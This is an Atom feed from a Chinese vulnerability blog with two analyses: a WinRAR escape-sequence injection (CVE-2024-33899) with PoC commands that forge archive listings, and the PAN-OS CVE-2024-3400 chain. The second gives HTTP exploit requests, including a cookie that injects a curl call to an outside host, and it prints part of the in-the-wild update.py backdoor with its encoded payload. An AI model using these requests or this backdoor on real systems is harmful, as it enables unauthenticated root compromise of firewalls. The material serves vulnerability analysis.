<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ç¨‹åºäººç”Ÿ</title>
  
  <subtitle>Fuzzing / Vulnerability / Exploit</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://programlife.net/"/>
  <updated>2024-05-26T13:58:10.000Z</updated>
  <id>https://programlife.net/</id>
  
  <author>
    <name>Ke Liu</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CVE-2024-33899 WinRAR RAR/UnRAR Escape Sequence æ³¨å…¥æ¼æ´</title>
    <link href="https://programlife.net/2024/05/26/cve-2024-33899-winrar-escape-sequence-injection-vulnerability/"/>
    <id>https://programlife.net/2024/05/26/cve-2024-33899-winrar-escape-sequence-injection-vulnerability/</id>
    <published>2024-05-26T13:33:37.000Z</published>
    <updated>2024-05-26T13:58:10.000Z</updated>
    
    <content type="html"><![CDATA[<p>ä» CVE-2024-33899 çœ‹<strong>åƒåœ¾è‹±æ–‡å°ç¼–</strong>æ±¡æŸ“ç®€ä½“ä¸­æ–‡äº’è”ç½‘ğŸ¤¡</p><a id="more"></a><h2 id="0x01-æ¼æ´ç®€ä»‹"><a href="#0x01-æ¼æ´ç®€ä»‹" class="headerlink" title="0x01. æ¼æ´ç®€ä»‹"></a>0x01. æ¼æ´ç®€ä»‹</h2><p>WinRAR é‡Œé¢å­˜åœ¨çš„ <a href="https://programlife.net/tags/Escape-Sequence/">Escape Sequence</a> æ³¨å…¥æ¼æ´ï¼Œå½±å“å‘½ä»¤è¡Œç‰ˆæœ¬çš„ RAR å’Œ UnRARï¼š</p><ul><li>Windows CVE-2024â€“36052</li><li>Linux/Unix CVE-2024â€“33899</li></ul><p>PoC æµ‹è¯•ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">wget https://www.win-rar.com/fileadmin/winrar-versions/rarlinux-x64-624.tar.gz</span><br><span class="line">tar -xzf rarlinux-x64-624.tar.gz</span><br><span class="line">cd rar</span><br><span class="line">./rar a demo.rar readme.txt</span><br><span class="line">printf 'Hello \033[32mTHIS IS GREEN\033[0m\007' | ./rar c demo.rar</span><br><span class="line">./rar l demo.rar</span><br></pre></td></tr></table></figure><p><img src="/uploads/202405/winrar-escape-sequence-injection.webp" alt="CVE-2024-33899 WinRAR RAR/UnRAR Escape Sequence æ³¨å…¥æ¼æ´"></p><p>æ¼æ´æ¯”è¾ƒé¸¡è‚‹ï¼Œå°±æ˜¯ç©ç© Escape Sequence Injectionï¼Œæ¯”å¦‚ä¼ªé€ å‹ç¼©æ–‡ä»¶åˆ—è¡¨ï¼ˆå…³é”® Payload ä¸º <code>\e[8m</code>ï¼‰ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">printf 'Archive: demo.rar\nDetails: RAR 5\n\nAttributes      Size       Date   Time   Name\n----------- ---------  ---------- -----  ---------\n-rw-r--r--          7  2024-05-19 16:26  notvirus.pdf\n----------- ---------  ---------- -----  ---------\n                    7                    1\e[8m' | rar c demo.rar</span><br></pre></td></tr></table></figure><p>å¯¹äºæŸäº›ç¯å¢ƒå¯ä»¥ DoSï¼Œå‚è€ƒ <a href="https://www.blackhat.com/us-23/briefings/schedule/#weaponizing-plain-text-ansi-escape-sequences-as-a-forensic-nightmare-31757" target="_blank" rel="noopener">Weaponizing Plain Text: ANSI Escape Sequences as a Forensic Nightmare</a>ã€‚</p><h2 id="0x02-æ•…äº‹èµ·æº"><a href="#0x02-æ•…äº‹èµ·æº" class="headerlink" title="0x02. æ•…äº‹èµ·æº"></a>0x02. æ•…äº‹èµ·æº</h2><p>åœ¨å¾®ä¿¡å…¬ä¼—å·çœ‹åˆ°æŸæ¡æ¨é€ï¼š</p><blockquote><p><strong>WinRAR æ¼æ´è®©æ”»å‡»è€…åˆ©ç”¨ ANSI è½¬ä¹‰åºåˆ—æ¬ºéª—ç”¨æˆ·</strong></p><p>é€šè¿‡åˆ¶ä½œåŒ…å«è¿™äº›åºåˆ—çš„æ¶æ„æ¡£æ¡ˆï¼Œæ”»å‡»è€…å¯ä»¥æ“çºµæ˜¾ç¤ºçš„è¾“å‡ºå¹¶æ¬ºéª—ç”¨æˆ·ç›¸ä¿¡ä»–ä»¬æ­£åœ¨æ‰“å¼€æ— å®³çš„æ–‡ä»¶ï¼Œä¾‹å¦‚ PDF æˆ–å›¾åƒã€‚</p><p>å½“ç”¨æˆ·å°è¯•åœ¨WinRARä¸­æ‰“å¼€çœ‹ä¼¼æ— å®³çš„æ–‡ä»¶æ—¶ï¼Œç”±äºå¯¹æ–‡ä»¶æ‰©å±•åå¤„ç†ä¸å½“ï¼Œæ¼æ´å°±ä¼šè¢«è§¦å‘ã€‚</p><p>Dushantha è¡¨ç¤ºï¼ŒWinRAR çš„ ShellExecute å‡½æ•°æ²¡æœ‰å¯åŠ¨é¢„æœŸçš„æ–‡ä»¶ï¼Œè€Œæ˜¯æ”¶åˆ°äº†é”™è¯¯çš„å‚æ•°å¹¶æ‰§è¡Œäº†éšè—çš„æ¶æ„è„šæœ¬ï¼Œä¾‹å¦‚æ‰¹å¤„ç†æ–‡ä»¶ (.bat) æˆ–å‘½ä»¤è„šæœ¬ (.cmd) ã€‚</p></blockquote><p>çœ‹èµ·æ¥æŠŠ WinRAR æ¼æ´ CVE-2023-38831 çš„å½±å“ç§»æ¤è¿‡æ¥äº†ï¼Œè€Œä¸”è¯´æ˜¯æ¼æ´ä½œè€… Dushantha è¯´çš„ğŸ¤¡ï¼Œè¿™é‡Œæ˜¯ç›´æ¥ç¿»è¯‘äº†è‹±æ–‡å†…å®¹ï¼š</p><blockquote><p>By crafting malicious archives containing these sequences, attackers can manipulate the displayed output and deceive users into believing they are opening a harmless file, such as a PDF or image.</p><p>When a user attempts to open the seemingly benign file from within WinRAR, the vulnerability is triggered due to improper handling of file extensions.</p><p>Instead of launching the expected file, WinRARâ€™s ShellExecute function receives an incorrect parameter and executes a hidden malicious script, such as a batch file (.bat) or command script (.cmd), Dushantha <a href="https://sdushantha.medium.com/ansi-escape-injection-vulnerability-in-winrar-a2cbfac4b983" target="_blank" rel="noopener">said</a>.</p></blockquote><p>è¿˜ç»™å‡ºäº†ä½œè€…çš„åŸå§‹ Blogï¼Œç®€ç›´ä¸€æœ¬æ­£ç»èƒ¡è¯´å…«é“ã€‚</p><h2 id="0x03-References"><a href="#0x03-References" class="headerlink" title="0x03. References"></a>0x03. References</h2><ol><li><a href="https://sdushantha.medium.com/ansi-escape-injection-vulnerability-in-winrar-a2cbfac4b983" target="_blank" rel="noopener">ANSI Escape Injection Vulnerability in WinRAR | by Siddharth Dushantha | May, 2024 | Medium</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ä» CVE-2024-33899 çœ‹&lt;strong&gt;åƒåœ¾è‹±æ–‡å°ç¼–&lt;/strong&gt;æ±¡æŸ“ç®€ä½“ä¸­æ–‡äº’è”ç½‘ğŸ¤¡&lt;/p&gt;
    
    </summary>
    
      <category term="Vulnerability" scheme="https://programlife.net/categories/Vulnerability/"/>
    
      <category term="Analysis" scheme="https://programlife.net/categories/Vulnerability/Analysis/"/>
    
    
      <category term="Escape Sequence" scheme="https://programlife.net/tags/Escape-Sequence/"/>
    
      <category term="WinRAR" scheme="https://programlife.net/tags/WinRAR/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2024-3400 PAN-OS è·¯å¾„ç©¿è¶Š&amp;å‘½ä»¤æ³¨å…¥æ¼æ´åˆ©ç”¨</title>
    <link href="https://programlife.net/2024/04/21/cve-2024-3400-panos-path-traversal-and-command-injection-vulnerability/"/>
    <id>https://programlife.net/2024/04/21/cve-2024-3400-panos-path-traversal-and-command-injection-vulnerability/</id>
    <published>2024-04-21T13:33:37.000Z</published>
    <updated>2024-04-20T16:30:19.000Z</updated>
    
    <content type="html"><![CDATA[<p>æœ¬æ–‡æ•´ç†äº†ç½‘ä¸Šå…³äº PAN-OS åœ¨é‡æ”»å‡»æ¼æ´ CVE-2024-3400 çš„å„ç§æŠ€æœ¯ç»†èŠ‚ä¿¡æ¯ï¼ŒåŒ…æ‹¬ <strong>Cookie ä¸­çš„è·¯å¾„ç©¿è¶Šæ¼æ´</strong>å’Œ <strong>Telemetry ä¸­çš„å‘½ä»¤æ³¨å…¥æ¼æ´</strong>çš„ç»„åˆåˆ©ç”¨ï¼Œä»¥åŠæ”»å‡»è€… Post-Exploitation ç›¸å…³çš„ç»†èŠ‚ä¿¡æ¯ã€‚æ­¤å¤–ï¼ŒBishop Fox å‘ç°äº†æ–°çš„å‘½ä»¤æ³¨å…¥æ¼æ´ï¼Œå› æ­¤å¸¦æœ‰æ¼æ´çš„ç³»ç»Ÿä»…ä»…æ˜¯ç¦ç”¨ Telemetry æœåŠ¡æ˜¯æ²¡æœ‰ç”¨çš„ã€‚</p><a id="more"></a><p>å› ä¸ºæ²¡æœ‰æ¼æ´å¤ç°ç¯å¢ƒï¼Œæœ¬æ–‡ä»…ä»…æ˜¯åŸºäºä¿¡æ¯æ•´ç†å†™çš„ä¸€ç¯‡ç¬”è®°ï¼Œå¦‚æœä½ å…³æ³¨çš„æ˜¯å¦‚ä½•æ­å»ºå¤ç°ç¯å¢ƒï¼Œå¯ä»¥å‚è€ƒ <a href="#2-1-æ¼æ´ä¿¡æ¯"><strong>2.1 æ¼æ´ä¿¡æ¯</strong></a> ä¸­å¼•ç”¨çš„æ–‡ç« é“¾æ¥ã€‚</p><h2 id="0x01-æ¼æ´ç®€ä»‹"><a href="#0x01-æ¼æ´ç®€ä»‹" class="headerlink" title="0x01. æ¼æ´ç®€ä»‹"></a>0x01. æ¼æ´ç®€ä»‹</h2><p>Volexity Threat Research åœ¨ 2024-04-10 æ•è·çš„é’ˆå¯¹ PAN-OS è®¾å¤‡çš„åœ¨é‡æ”»å‡»æ¼æ´åˆ©ç”¨ï¼ŒPalo Alto Networks åœ¨ 2024-04-11 å‘å¸ƒå®‰å…¨å…¬å‘Šå¹¶åˆ†é… CVE ç¼–å· CVE-2024-3400ã€‚</p><p>è™½ç„¶åªæœ‰ä¸€ä¸ª CVE ç¼–å·ï¼Œä½†å®é™…ä¸Šåœ¨é‡æ”»å‡»ä½¿ç”¨äº†ä¸¤ä¸ªæ¼æ´ï¼š</p><ul><li>SSL VPN Cookie è§£æè·¯å¾„ç©¿è¶Šæ¼æ´ï¼Œåœ¨æœªç™»å½•çš„æƒ…å†µä¸‹å¯ä»¥ä»¥ <code>root</code> æƒé™åˆ›å»ºä»»æ„æ–‡ä»¶ï¼ˆç©ºæ–‡ä»¶ï¼‰</li><li>Telemetry å‘½ä»¤æ³¨å…¥æ¼æ´ï¼Œé…åˆä¸Šè¿°æ–‡ä»¶åå®ç°ä»£ç æ‰§è¡Œ</li></ul><p>ç»„åˆåˆ©ç”¨å³å¯è¾¾åˆ°æ— éœ€ç™»å½•å³å¯å®ç°è¿œç¨‹ä»»æ„ä»£ç æ‰§è¡Œçš„æ•ˆæœã€‚</p><p>Telemetry å‘½ä»¤æ³¨å…¥æ¼æ´ä¾èµ–äº Telemetry æœåŠ¡çš„å¼€å¯ï¼Œä½†æ˜¯ä¹Ÿå¯ä»¥ç»„åˆåˆ©ç”¨å…¶ä»–ä¸éœ€è¦å‰ç½®æ¡ä»¶çš„å‘½ä»¤æ³¨å…¥æ¼æ´ï¼Œæ¯”å¦‚ Bishop Fox æåˆ°ä»–ä»¬å‘ç°å¹¶æŠ¥å‘Šäº†ä¸€ä¸ªæ–°çš„ä¸”ä¸ä¾èµ–äº Telemetry çš„å‘½ä»¤æ³¨å…¥æ¼æ´ï¼ˆå½“å‰æš‚æ— å…¬å¼€ç»†èŠ‚ä¿¡æ¯ï¼‰ã€‚</p><h2 id="0x02-æ¼æ´ç»†èŠ‚"><a href="#0x02-æ¼æ´ç»†èŠ‚" class="headerlink" title="0x02. æ¼æ´ç»†èŠ‚"></a>0x02. æ¼æ´ç»†èŠ‚</h2><h3 id="2-1-æ¼æ´ä¿¡æ¯"><a href="#2-1-æ¼æ´ä¿¡æ¯" class="headerlink" title="2.1 æ¼æ´ä¿¡æ¯"></a>2.1 æ¼æ´ä¿¡æ¯</h3><blockquote><p>A command injection as a result of arbitrary file creation vulnerability in the GlobalProtect feature of Palo Alto Networks PAN-OS software for specific PAN-OS versions and distinct feature configurations may enable an unauthenticated attacker to execute arbitrary code with root privileges on the firewall.</p></blockquote><p><strong>ç ”ç©¶è¿™ç±»æ¼æ´æœ€å¤§çš„éšœç¢å°±æ˜¯å¤ç°ç¯å¢ƒæ­å»º</strong>ï¼Œå› ä¸ºå‚å•†ä¸å¯¹éå®¢æˆ·å¼€æ”¾è™šæ‹Ÿæœºé•œåƒä¸‹è½½æƒé™ :-(</p><ul><li><a href="https://labs.watchtowr.com/palo-alto-putting-the-protecc-in-globalprotect-cve-2024-3400/" target="_blank" rel="noopener">watchTowr Labs: Palo Alto - Putting The Protecc In GlobalProtect (CVE-2024-3400)</a> çš„æ–¹æ³•æ˜¯å» AWS Marketplace ç”³è¯·ä¸€ä¸ªå¯¹åº”çš„ AWS è™šæ‹Ÿæœºå®ä¾‹ï¼Œä½†æ˜¯å¸¦æ¼æ´çš„ PAN-OS ç‰ˆæœ¬éšæ—¶ä¼šè¢«ä¸‹æ¶</li><li><a href="https://www.sprocketsecurity.com/resources/patch-diffing-cve-2024-3400-from-a-palo-alto-ngfw-marketplace-ami" target="_blank" rel="noopener">Sprocket Security: Patch Diffing CVE-2024-3400 from a Palo Alto NGFW Marketplace AMI</a> æŒ‡å‡ºäº† AWS è™šæ‹Ÿæœºç¤ºä¾‹å¯¹ PAN-OS è¿›è¡Œé™çº§çš„æ–¹æ³•</li></ul><p>é™¤äº†æ‹¿åˆ°è™šæ‹Ÿæœºé•œåƒå¤–ï¼Œè·å– <code>root</code> æƒé™ä¹Ÿæ˜¯ä¸€ä¸ªæ¯”è¾ƒé‡è¦çš„æ“ä½œï¼Œ<a href="https://attackerkb.com/topics/SSTk336Tmf/cve-2024-3400/rapid7-analysis" target="_blank" rel="noopener">Rapid7</a> çš„æ–‡ç« ç»™å‡ºäº†ä¸€ä¸ªæ¯”è¾ƒç®€å•çš„è§£å†³æ–¹æ¡ˆï¼š</p><ul><li>ç³»ç»Ÿå¯åŠ¨æ—¶å¯¹ <code>/var</code> æ²¡æœ‰å®Œæ•´æ€§æ ¡éªŒ</li><li>æŒ‚è½½è™šæ‹Ÿæœºç£ç›˜åœ¨ <code>/var/appweb/htdocs/unauth/php</code> æ’å…¥ä¸€ä¸ª PHP WebShell</li><li>ç¼–è¯‘ä¸€ä¸ª SUID-root ç¨‹åºé…åˆ PHP WebShell ä»¥ <code>root</code> æƒé™æ‰§è¡Œå‘½ä»¤</li><li>ä»¥ <code>root</code> æƒé™ä¿®æ”¹ <code>/etc/passwd</code> å®ç° SSH æ‹¿åˆ° <code>root</code> Shell</li></ul><p>ç±»ä¼¼çš„æŠ€å·§åœ¨çœ‹é›ªä¸Šä¹Ÿæœ‰è®¨è®ºåˆ†äº«ï¼š<a href="https://bbs.kanxue.com/thread-281287.htm" target="_blank" rel="noopener">è·å–è™šæ‹Ÿæœºçš„shell</a>ã€‚</p><h3 id="2-2-Cookie-è·¯å¾„ç©¿è¶Š"><a href="#2-2-Cookie-è·¯å¾„ç©¿è¶Š" class="headerlink" title="2.2 Cookie è·¯å¾„ç©¿è¶Š"></a>2.2 Cookie è·¯å¾„ç©¿è¶Š</h3><p>SSL VPN çš„é¡µé¢ <code>/ssl-vpn/hipreport.esp</code> åœ¨è§£æ Cookie SESSID æ—¶å­˜åœ¨<strong>è·¯å¾„ç©¿è¶Šæ¼æ´</strong>ï¼ˆ<a href="https://programlife.net/tags/Path-Traversal/">Path Traversal Vulnerability</a>ï¼‰ï¼Œä¸”è¯¥é¡µé¢ä¸éœ€è¦ç™»å½•å°±å¯ä»¥è®¿é—®ã€‚</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/ssl-vpn/hipreport.esp</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: &lt;Hostname&gt;</span><br><span class="line"><span class="attribute">Cookie</span>: SESSID=/../../../var/appweb/sslvpndocs/global-protect/portal/images/watchtowr.txt;</span><br></pre></td></tr></table></figure><p>è§¦å‘æ¼æ´åï¼Œå¦‚æœå¯¹åº”çš„æ–‡ä»¶ä¸å­˜åœ¨ï¼Œå°†ä¼šä»¥ <code>root</code> æƒé™åˆ›å»ºä¸€ä¸ªç©ºæ–‡ä»¶ã€‚</p><h3 id="2-3-Telemetry-å‘½ä»¤æ³¨å…¥"><a href="#2-3-Telemetry-å‘½ä»¤æ³¨å…¥" class="headerlink" title="2.3 Telemetry å‘½ä»¤æ³¨å…¥"></a>2.3 Telemetry å‘½ä»¤æ³¨å…¥</h3><p>PAN-OS çš„ Telemetry æœåŠ¡ä¼šå®šæ—¶å°†æŒ‡å®šæ–‡ä»¶å¤¹ä¸‹çš„æ—¥å¿—æ–‡ä»¶å›ä¼ ç»™ Palo Alto Networks çš„æœåŠ¡å™¨ï¼Œè€Œè¿™é‡Œç›¸å…³çš„ä¸€ä¸ª Python æ–‡ä»¶ <code>/p2/usr/local/bin/dt_curl</code> å­˜åœ¨<strong>å‘½ä»¤æ³¨å…¥æ¼æ´</strong>ï¼ˆ<a href="https://programlife.net/tags/Command-Injection/">Command Injection Vulnerability</a>ï¼‰ï¼Œå…³é”®ä»£ç å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> source_ip_str <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span> <span class="keyword">and</span> source_ip_str != <span class="string">""</span>: </span><br><span class="line">    curl_cmd = <span class="string">"/usr/bin/curl -v -H \"Content-Type: application/octet-stream\" -X PUT \"%s\" --data-binary @%s --capath %s --interface %s"</span> \</span><br><span class="line">                 %(signedUrl, fname, capath, source_ip_str)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    curl_cmd = <span class="string">"/usr/bin/curl -v -H \"Content-Type: application/octet-stream\" -X PUT \"%s\" --data-binary @%s --capath %s"</span> \</span><br><span class="line">                 %(signedUrl, fname, capath)</span><br><span class="line"><span class="keyword">if</span> dbg:</span><br><span class="line">    logger.info(<span class="string">"S2: XFILE: send_file: curl cmd: '%s'"</span> %curl_cmd)</span><br><span class="line">stat, rsp, err, pid = pansys(curl_cmd, shell=<span class="keyword">True</span>, timeout=<span class="number">250</span>)</span><br></pre></td></tr></table></figure><p>ç•™æ„ <code>fname</code> å’Œ <code>shell=True</code></p><ul><li><code>fname</code> å³ä¸ºæœ¬åœ°æ–‡ä»¶è·¯å¾„ï¼Œå¯ä»¥æ˜¯å‰é¢ Cookie SESSID è§£æè·¯å¾„ç©¿è¶Šæ¼æ´æ‰€åˆ›å»ºçš„æ–‡ä»¶</li><li><code>pansys(curl_cmd, shell=True, timeout=250)</code> è¡¨æ˜å¾ˆæœ‰å¯èƒ½æ³¨å…¥çš„å‚æ•°ä¼šè¢«å½“åšå‘½ä»¤æ¥æ‰§è¡Œ</li></ul><p><code>pansys</code> æœ€ç»ˆè°ƒç”¨ <code>/p2/lib64/python3.6/site-packages/pansys/pansys.py</code> ä¸­çš„ <code>pansys.dosys()</code>ï¼Œç›¸å…³ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dosys</span><span class="params">(self, command, close_fds=True, shell=False, timeout=<span class="number">30</span>, first_wait=None)</span>:</span></span><br><span class="line">    <span class="string">"""call shell-command and either return its output or kill it</span></span><br><span class="line"><span class="string">       if it doesn't normally exit within timeout seconds"""</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Define dosys specific constants here</span></span><br><span class="line">    PANSYS_POST_SIGKILL_RETRY_COUNT = <span class="number">5</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># how long to pause between poll-readline-readline cycles</span></span><br><span class="line">    PANSYS_DOSYS_PAUSE = <span class="number">0.1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Use first_wait if time to complete is lengthy and can be estimated </span></span><br><span class="line">    <span class="keyword">if</span> first_wait == <span class="keyword">None</span>:</span><br><span class="line">        first_wait = PANSYS_DOSYS_PAUSE</span><br><span class="line"></span><br><span class="line">    <span class="comment"># restrict the maximum possible dosys timeout</span></span><br><span class="line">    PANSYS_DOSYS_MAX_TIMEOUT = <span class="number">23</span> * <span class="number">60</span> * <span class="number">60</span></span><br><span class="line">    <span class="comment"># Can support upto 2GB per stream</span></span><br><span class="line">    out = StringIO()</span><br><span class="line">    err = StringIO()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> shell:</span><br><span class="line">            cmd = command</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            cmd = command.split()</span><br><span class="line">    <span class="keyword">except</span> AttributeError: cmd = command</span><br><span class="line"></span><br><span class="line">    p = subprocess.Popen(cmd, stdout=subprocess.PIPE, bufsize=<span class="number">1</span>, shell=shell,</span><br><span class="line">             stderr=subprocess.PIPE, close_fds=close_fds, universal_newlines=<span class="keyword">True</span>)</span><br><span class="line">    timer = pansys_timer(timeout, PANSYS_DOSYS_MAX_TIMEOUT)</span><br></pre></td></tr></table></figure><p><code>shell=True</code> æœ€ç»ˆä¼šä¼ é€’åˆ° <code>subprocess.Popen()</code>ï¼Œå³åˆ›å»ºä¸€ä¸ª Shell æ¥æ‰§è¡Œå‘½ä»¤ï¼Œé‚£ä¹ˆå‰é¢é€šè¿‡ <code>fname</code> æ³¨å…¥çš„ä»£ç å°±å¯ä»¥è¢«æ‰§è¡Œäº†ã€‚</p><h3 id="2-4-ç»„åˆåˆ©ç”¨"><a href="#2-4-ç»„åˆåˆ©ç”¨" class="headerlink" title="2.4 ç»„åˆåˆ©ç”¨"></a>2.4 ç»„åˆåˆ©ç”¨</h3><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/ssl-vpn/hipreport.esp</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: &lt;Hostname&gt;</span><br><span class="line"><span class="attribute">Cookie</span>: SESSID=/../../../opt/panlogs/tmp/device_telemetry/minute/hellothere`curl$&#123;IFS&#125;x1.outboundhost.com`;</span><br></pre></td></tr></table></figure><p>å‘½ä»¤æ³¨å…¥çš„å¸¸è§„æ“ä½œæŠ€å·§ï¼š</p><ul><li><code>`</code> ç”¨æ¥æ‰§è¡Œå‘½ä»¤</li><li><code>${IFS}</code> ç”¨æ¥ç»•è¿‡ç©ºæ ¼é™åˆ¶</li></ul><h3 id="2-5-å…¶ä»–è¯´æ˜"><a href="#2-5-å…¶ä»–è¯´æ˜" class="headerlink" title="2.5 å…¶ä»–è¯´æ˜"></a>2.5 å…¶ä»–è¯´æ˜</h3><p><a href="https://github.com/gorilla/sessions/pull/274" target="_blank" rel="noopener">gorilla/sessions Pull Requests - Improve File System Path Handling #274</a> åœ¨è®¨è®ºå‰é¢æåˆ°çš„è·¯å¾„ç©¿è¶Šæ¼æ´æ˜¯å¦æ˜¯ gorilla/sessions è‡ªå¸¦çš„æ¼æ´ï¼Œç»“è®ºæ˜¯ï¼š</p><ul><li>å¹¶é gorilla/sessions çš„æ¼æ´</li><li>æ˜¯ Palo Alto Networks åœ¨å®ç° <code>SessDiskStore</code> æ—¶å­˜åœ¨çš„æ¼æ´</li></ul><blockquote><p>The Palo Alto vulnerability described in <a href="https://labs.watchtowr.com/palo-alto-putting-the-protecc-in-globalprotect-cve-2024-3400/" target="_blank" rel="noopener">https://labs.watchtowr.com/palo-alto-putting-the-protecc-in-globalprotect-cve-2024-3400/</a> seems to be in a different internal Store implementation called SessDiskStore, which works similarly (maybe derived from FilesystemStore) but does not authenticate the session ID.</p></blockquote><p>æ­¤å¤–ï¼ŒTelemetry ä¸­çš„å‘½ä»¤æ³¨å…¥æ¼æ´éœ€è¦åœ¨å¼€å¯ Telemetry åŠŸèƒ½çš„æƒ…å†µä¸‹æ‰èƒ½è§¦å‘ï¼Œæœ€å¼€å§‹ Palo Alto Networks çš„å®‰å…¨å…¬å‘Šä¹Ÿè¯´äº†è¿™ä¸ªå‰ç½®æ¡ä»¶ï¼Œä½†æ˜¯åé¢æ›´æ–°æ—¶åˆå»æ‰äº†è¿™ä¸ªæ¡ä»¶ã€‚</p><blockquote><p>This issue is applicable only to PAN-OS 10.2, PAN-OS 11.0, and PAN-OS 11.1 firewalls configured with GlobalProtect gateway or GlobalProtect portal (or both). <strong>Device telemetry does not need to be enabled</strong> for PAN-OS firewalls to be exposed to attacks related to this vulnerability.</p></blockquote><p>åœ¨æœªå¼€å¯ Telemetry çš„æƒ…å†µä¸‹æ˜¯å¦èƒ½è¾¾åˆ°ç±»ä¼¼å‘½ä»¤æ³¨å…¥çš„åˆ©ç”¨æ•ˆæœï¼Ÿç›®å‰æš‚æ—¶æ²¡æœ‰å…¬å¼€çš„ç»†èŠ‚ä¿¡æ¯ï¼Œä½†æ˜¯ Bishop Fox åœ¨æ–‡ç«  <a href="https://bishopfox.com/blog/pan-os-cve-2024-3400-patch-your-palo-alto-firewalls" target="_blank" rel="noopener">PAN-OS CVE-2024-3400: Patch Your Palo Alto Firewalls</a> æåˆ°ä»–ä»¬å‘ç°äº†ä¸€ä¸ªæ–°çš„ä¸”ä¸ä¾èµ–äº Telemetry çš„å‘½ä»¤æ³¨å…¥æ¼æ´ï¼Œåœ¨ä»–ä»¬å°†ç»†èŠ‚æŠ¥å‘Šç»™ Palo Alto Networks ä¹‹åï¼ŒPAN æ‰æ›´æ–°äº†æ¼æ´å…¬å‘Šä¿¡æ¯ã€‚</p><blockquote><p>We developed bypasses for both recommended interim mitigations. We were able to successfully evade Threat Prevention signatures, and we identified a new command injection vulnerability which is exploitable even when device telemetry is disabled.</p></blockquote><p><img src="/uploads/202404/cve-2024-3400-panos-disable-telemetry-never-works.webp" alt="CVE-2024-3400 PANOS Disable Telemetry Never Works"></p><h2 id="0x03-Post-Exploitation"><a href="#0x03-Post-Exploitation" class="headerlink" title="0x03. Post-Exploitation"></a>0x03. Post-Exploitation</h2><p>Volexity Threat Research åœ¨æ–‡ç«  <a href="https://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400/" target="_blank" rel="noopener">Zero-Day Exploitation of Unauthenticated Remote Code Execution Vulnerability in GlobalProtect (CVE-2024-3400)</a> ä¸­ç»™å‡ºäº†æ”»å‡»è¡ŒåŠ¨çš„ä¸€äº›å…·ä½“ç»†èŠ‚ä¿¡æ¯ã€‚</p><h3 id="3-1-update-py-backdoor"><a href="#3-1-update-py-backdoor" class="headerlink" title="3.1 update.py backdoor"></a>3.1 update.py backdoor</h3><blockquote><p>Zero-day exploitation of a vulnerability in Palo Alto Global Protect firewall devices that allowed for unauthenticated remote code execution to take place. Initial exploitation was used to create a reverse shell, download tools, exfiltrate configuration data, and move laterally within the network.</p></blockquote><p><code>update.py</code> å¯ä»¥ä» <a href="https://bazaar.abuse.ch/sample/3de2a4392b8715bad070b2ae12243f166ead37830f7c6d24e778985927f9caac/" target="_blank" rel="noopener">MalwareBazaar</a> ä¸‹è½½åˆ°ï¼Œæºç å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os,base64,time</span><br><span class="line">systempth = <span class="string">"/usr/lib/python3.6/site-packages/system.pth"</span></span><br><span class="line"><span class="keyword">with</span> open(systempth,<span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">b'''import base64;exec(base64.b64decode(b"CgoKZGVmIGNoZWNrKCk6CiAgICBpbXBvcnQgb3Msc3VicHJvY2Vzcyx0aW1lLHN5cwoKCiAgICBkZWYgc3RhcnRfcHJvY2VzcygpOgogICAgICAgIGltcG9ydCBiYXNlNjQKICAgICAgICBmdW5jdGlvbmNvZGUgPSBiIlpHVm1JRjlmYldGcGJpZ3BPZzBLSUNBZ0lHbHRjRzl5ZENCMGFISmxZV1JwYm1jc2RHbHRaU3h2Y3l4eVpTeGlZWE5sTmpRTkNnMEtEUW9OQ2lBZ0lDQmtaV1lnY21WemRHOXlaU2hqYzNOZmNHRjBhQ3hqYjI1MFpXNTBMR0YwYVcxbExHMTBhVzFsS1RvTkNpQWdJQ0FnSUNBZ2FXMXdiM0owSUc5ekxIUnBiV1VOQ2lBZ0lDQWdJQ0FnZEdsdFpTNXpiR1ZsY0NneE5Ta05DaUFnSUNBZ0lDQWdkMmwwYUNCdmNHVnVLR056YzE5d1lYUm9MQ2QzSnlrZ1lYTWdaam9OQ2lBZ0lDQWdJQ0FnSUNBZ0lHWXVkM0pwZEdVb1kyOXVkR1Z1ZENrTkNpQWdJQ0FnSUNBZ2IzTXVkWFJwYldVb1kzTnpYM0JoZEdnc0tHRjBhVzFsTEcxMGFXMWxLU2tOQ2lBZ0lDQWdJQ0FnRFFvTkNpQWdJQ0FnSUNBZ0RRb2dJQ0FnWkdWbUlGOWZhWE5mZDJodmJHVmZhRzkxY2lncE9nMEtJQ0FnSUNBZ0lDQm1jbTl0SUdSaGRHVjBhVzFsSUdsdGNHOXlkQ0JrWVhSbGRHbHRaUTBLSUNBZ0lDQWdJQ0JqZFhKeVpXNTBYM1JwYldVZ1BTQmtZWFJsZEdsdFpTNXViM2NvS1M1MGFXMWxLQ2tOQ2lBZ0lDQWdJQ0FnY21WMGRYSnVJR04xY25